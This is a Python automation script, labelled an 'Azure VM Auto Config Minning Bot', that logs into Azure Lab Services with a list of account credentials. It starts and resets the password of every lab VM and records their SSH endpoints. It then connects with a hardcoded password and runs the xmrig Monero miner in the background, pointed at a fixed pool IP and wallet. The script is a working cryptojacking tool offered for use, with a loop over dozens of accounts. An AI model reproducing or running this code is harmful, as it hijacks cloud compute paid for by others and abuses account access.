import sys
import paramiko 
sys.stderr = sys.__stderr__
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
import selenium.webdriver.support.expected_conditions as EC
from selenium.webdriver.common.by import By
import selenium.webdriver.support.ui as ui
from random import choice
import requests
from bs4 import BeautifulSoup
from selenium.common.exceptions import TimeoutException
from selenium.webdriver.support.ui import Select
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.action_chains import ActionChains
from selenium.common.exceptions import NoSuchElementException
from selenium.webdriver.common.proxy import Proxy, ProxyType
from fake_useragent import UserAgent
import csv
from faker import Faker
from faker.providers import person
import random
import string
from time import sleep as wait
import sys
from pyvirtualdisplay import Display
import json
from urllib.request import urlretrieve
import requests
from python_anticaptcha import AnticaptchaClient, ImageToTextTask
import time
import os
from selenium.webdriver.firefox.firefox_profile import FirefoxProfile
from colorama import Fore, Back, Style 
from colorama import init
init()

def login_labs(email,passwd,nama_lab,empas):
    try:
        output = ""
        global driver
        print("Azure VM Auto Config Minning Bot by Riskids")
        print("Setting VM...")
        
        email = email.replace(" ", "")
        
        # prox = Proxy({
        #     'proxyType': ProxyType.MANUAL,
        #     'httpProxy': myproxy,
        #     'ftpProxy': myproxy,
        #     'sslProxy': myproxy,
        #     'noProxy': '' # set this value as desired
        #     })
        profile = webdriver.FirefoxProfile()
        profile.set_preference("general.useragent.override", UserAgent(verify_ssl=False, cache=False).random)
        # profile.set_preference("network.proxy.type", 1)
        # profile.set_preference("network.proxy.share_proxy_settings", True)
        # profile.set_preference("network.proxy.http_port", int(port))
        # profile.set_preference("network.proxy.http", str(host))
        # profile = FirefoxProfile()
        # profile.set_preference("network.proxy.type", 1)
        # profile.set_preference("browser.cache.disk.enable", False)
        # profile.set_preference("browser.cache.memory.enable", False)
        # profile.set_preference("browser.cache.offline.enable", False)
        # profile.set_preference("network.http.use-cache", False)
        # profile.set_preference("network.proxy.socks", str(host))
        # profile.set_preference("network.proxy.socks_port", int(port))

        #firefox_capabilities = webdriver.DesiredCapabilities.FIREFOX
        #firefox_capabilities['marionette'] = True
        #firefox_capabilities['proxy'] = {
        #    "proxyType": "MANUAL",
        #    "httpProxy": myproxy,
        #    "ftpProxy": myproxy,
        #    "sslProxy": myproxy,
        #    }
        
        print("use user-agent: ", UserAgent(verify_ssl=False, cache=False).random)
        # windows driver
        driver = webdriver.Firefox(executable_path='../drivers/geckodriver',firefox_profile=profile) 
        
        # macOs Driver
        # driver = webdriver.Firefox(executable_path='../drivers/macOs/geckodriver',firefox_profile=profile) 
        driver.get("https://labs.azure.com/")
        if is_visible("landing-page-header-title",90) is True:
            pass
        driver.find_element_by_xpath("//button[contains(.//text(), 'Sign in')]").click()
        if is_visible("i0116",90) is True:
           pass
        wait(0.5)
        driver.find_element_by_id("i0116").send_keys(email)
        wait(0.5)
        driver.find_element_by_id("idSIButton9").click()
        if is_visible("i0118",60) is True:
            pass
        driver.find_element_by_id("i0118").send_keys(passwd)
        wait(0.5)
        driver.find_element_by_id("idSIButton9").click()
        wait(2)
        if is_visible("iShowSkip",1) is True:    
            driver.find_element_by_id("iShowSkip").click()
            wait(2)
            print("akun warning!")
            
        if is_visible("idBtn_Back",0.5) is True:    
                driver.find_element_by_id("idBtn_Back").click()
                print("stay signed? skipping...")    

        if is_locked() is True:
            driver.find_element_by_class_name("salah bos").click()    

        if is_visible_switch() is True:
            print("logging in.....")
            print("labs loaded....")
            wait(1)
            #menyalakan vm mati
            if is_visible_switch_off(5) is True:
                print("ada vm off")
                switch = driver.find_elements_by_xpath("//button[contains(@aria-label,'Stopped')]")
                for x in range(0,len(switch)):
                    switch[x].click()
                #waiting for vm ON
                wait(1)
                while is_still_oning(5) is True: 
                    if is_still_oning(1) is False:
                        print("all vm on..")
                        break
                    print("turning vm on...")
                    wait(2)

            more_menu = driver.find_elements_by_xpath("//button[@aria-label='More actions menu' and @data-is-focusable='true']")
            count_vm = len(more_menu)
            print(Back.CYAN+"Jumlah VM yang tersedia: "+str(count_vm))
            print(Style.RESET_ALL)

            for n in range(0,len(more_menu)):
                more_menu[n].click()
                wait(0.5)
                ActionChains(driver).send_keys(Keys.TAB + Keys.ENTER).perform()
                wait(0.5)
                ActionChains(driver).send_keys("pepengkolan1!").perform()
                wait(0.5)
                ActionChains(driver).send_keys(Keys.TAB*2 + Keys.ENTER).perform()
                wait(0.5)
                print("VM " + str(n) + " resetted")
            print("all VM has been reset, waiting...")    
            
            #waiting for vm reset
            while is_still_reset(5) is True: 
                if is_still_reset(2) is False:
                    print("reset done..")
                    break
                print("resetting...")
                wait(2)

            active_vm =  driver.find_elements_by_xpath("//button[@aria-label='Connect to the virtual machine' and @data-is-focusable='true']")
            for n in range(0,len(active_vm)):
                active_vm[n].click()
                wait(0.5)
                ssh = driver.find_element_by_xpath("//textarea[contains(.//text(), 'ssh')]").text
                port = ssh[7:12]
                host = ssh[19:]
                print(host,":",port)
                with open('ip.txt', 'a+') as filehandle:
                    filehandle.write('%s:%s  \n' % (host,port))
                print("ssh setting saved!")  
                wait(0.2)
                ActionChains(driver).send_keys(Keys.ESCAPE).perform()
                konek_ssh(host,port,nama_lab) 
                print("VM " + str(n) + " on Mining!")

            print("all VM has been Configured, clossing...")    
            driver.quit()          
            return True

        else:
            driver.find_element_by_class_name("Request Time Out Bro").click() 
            print("RTO BOSS")
    except Exception as e:
        print('Error on line {}'.format(sys.exc_info()[-1].tb_lineno), type(e).__name__, e)
        driver.quit()   
        return False

def konek_ssh(host,port,namaworker,core=8):
     host = str(host)
     port = int(port)
     coreStr = str(core)
     username = "roots"
     password = "pepengkolan1!" 
     ssh = paramiko.SSHClient()
     ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
     ssh.connect(host, port, username, password)
     
     #run xmrig ========
     stdin, stdout, stderr = ssh.exec_command('''
     sudo su
     pepengkolan1!
     killall xmrig
     cd main_xmrig/xmrig-6.15.1
     nohup ./xmrig --donate-level 1 -o 51.79.137.110:3333 -u 82Vs2CSgMczP4j9C7e7mn5inpTzpxby3z2LrggqDfVDr3FUGRknMp6XgFdkBFFYJN7ZhuPLCCeDGGGz6YNEYFjJzUGTt4p6.''' + namaworker + ''' --print-time 5 -t '''+ coreStr +'''
     ''')
     print("berhasil run xmrig!")
     wait(0.2)
     ssh.close()
     print("ssh closed...")

     #kill xmrig ==========
    #  stdin, stdout, stderr = ssh.exec_command('''
    #  
    #  ''')
    #  print("berhasil kill xmrig!")
    #  wait(1)
    #  ssh.close()
    #  print("ssh closed...")

def random_char(y):
        return ''.join(random.choice(string.ascii_letters) for x in range(y))

def random_number(length=4):
        return ''.join([str(random.randint(0, 9)) for i in range(length)])

def is_visible(locator, timeout):
    try:
        ui.WebDriverWait(driver, timeout).until(EC.visibility_of_element_located((By.ID, locator)))
        return True
    except TimeoutException:
        return False

def is_visible_class(locator, timeout):
    try:
        ui.WebDriverWait(driver, timeout).until(EC.visibility_of_element_located((By.CLASS_NAME, locator))) 
        return True
    except TimeoutException:
        return False

def is_locked(timeout=5):
    try:
        ui.WebDriverWait(driver, timeout).until(EC.visibility_of_element_located((By.ID, "StartAction"))) 
        return True
    except TimeoutException:
        return False        

def is_visible_switch(timeout=120):
    try:
        ui.WebDriverWait(driver, timeout).until(EC.element_to_be_clickable((By.CLASS_NAME, "ms-Toggle-background"))) 
        return True
    except TimeoutException:
        return False

def is_visible_switch_off(timeout):
    try:
        ui.WebDriverWait(driver, timeout).until(EC.element_to_be_clickable((By.XPATH, "//button[contains(@aria-label,'Stopped')]"))) 
        return True
    except TimeoutException:
        return False

def is_still_reset(timeout):
    try:
        ui.WebDriverWait(driver, timeout).until(EC.visibility_of_element_located((By.XPATH, "//div[contains(.//text(), 'password...')]"))) 
        return True
    except TimeoutException:
        return False

def is_still_oning(timeout):
    try:
        ui.WebDriverWait(driver, timeout).until(EC.visibility_of_element_located((By.XPATH, "//span[contains(.//text(), 'Starting...')]"))) 
        return True
    except TimeoutException:
        return False

def get_proxy():
    with open("proxy.txt") as f:
        proxies = f.readlines()
        proxy = random.choice(proxies)
        return proxy

def prox_generator():
    response = requests.get("https://sslproxies.org/")
    soup = BeautifulSoup(response.content, 'html5lib')
    proxy = choice(list(map(lambda x:x[0]+':'+x[1], 
    list(zip(map(lambda x:x.text, soup.findAll('td')[::8]), map(lambda x:x.text, soup.findAll('td')[1::8]))))))
    return proxy
        
def page_has_loaded():
    page_state = driver.execute_script('return document.readyState;')
    return True

#=============== perintah utama ==================#
nama_lab = str(input("Masukan Nama Worker: " + "\n"))
with open("accLogin_1.txt", 'r') as f:
    count = 0
    for line in f:
        if count < 40:
            i = 0
            while i < 2:
                pieces = line.split(":")
                email = pieces[0]
                passwd = pieces[1]
                is_login = login_labs(email,"pepengkolan1",nama_lab,line)
                if is_login is True:
                    print(Back.GREEN+"Grab Account Done")
                    print(Style.RESET_ALL)
                    print("With Account : ",email)
                    count += 1
                    print("Total Account Grabbed: ",count)
                    break
            continue
        else:
            break    
print("Finished.")        